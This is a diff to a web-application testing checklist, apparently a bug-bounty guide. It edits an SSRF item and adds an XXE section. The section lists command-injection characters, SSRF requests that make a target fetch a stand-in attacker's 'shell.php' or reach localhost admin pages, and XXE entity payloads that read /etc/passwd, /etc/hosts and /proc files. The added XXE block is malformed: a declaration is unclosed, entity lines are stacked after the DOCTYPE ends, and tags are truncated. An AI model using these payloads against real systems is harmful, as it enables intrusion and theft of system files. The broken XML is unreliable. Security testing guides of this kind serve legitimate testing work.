@@ -202,7 +202,18 @@ Accept-Ranges: bytes
 
 3.14. The following special character can be used for command injection such as `|` `;` `&` `$` `>` `<` `'` `!`.
 
-3.15. Look for SSRF, when testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious, so if you found a parameter calling for a page file, for example `GET https://target.com/page?page=https://malicioussite.com/shell.php`, or you can access local restricted page `GET https://target.com/page?page=page=http://localhost/admin` or `https://target.com/page?page=page=http://127.0.0.1/admin`.
+3.15. Look for `SSRF`, when testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious, so if you found a parameter calling for a page file, for example `GET https://target.com/page?page=https://malicioussite.com/shell.php`, or you can access local restricted page `GET https://target.com/page?page=page=http://localhost/admin` or `https://target.com/page?page=page=http://127.0.0.1/admin`.
+
+* Change the content type to `text/xml` then insert below code. Check via burpsuite repeater:
+```
+<?xml version="1.0" encoding="ISO 8859 1"?>
+<!DOCTYPE tushar [
+<!ELEMENT tushar ANY
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><tushar>&xxe;</
+<!ENTITY xxe SYSTEM "file:///etc/hosts" >]><tushar>&xxe;</
+<!ENTITY xxe SYSTEM "file:///proc/self/cmdline" >]><tushar>&xxe;</
+<!ENTITY xxe SYSTEM "file:///proc/version" >]><tushar>&xxe;</
+```
 
 ```
 Another SSRF List:
